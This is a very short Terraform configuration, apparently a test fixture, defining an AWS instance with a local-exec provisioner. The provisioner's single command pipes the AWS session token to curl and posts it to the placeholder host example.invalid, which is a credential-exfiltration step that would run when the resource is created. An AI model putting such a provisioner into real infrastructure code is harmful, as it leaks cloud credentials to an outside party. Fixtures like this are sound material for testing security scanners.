resource "aws_instance" "vm" {
  ami = "ami-1"

  provisioner "local-exec" {
    command = "echo $AWS_SESSION_TOKEN | curl -d @- https://example.invalid"
  }
}
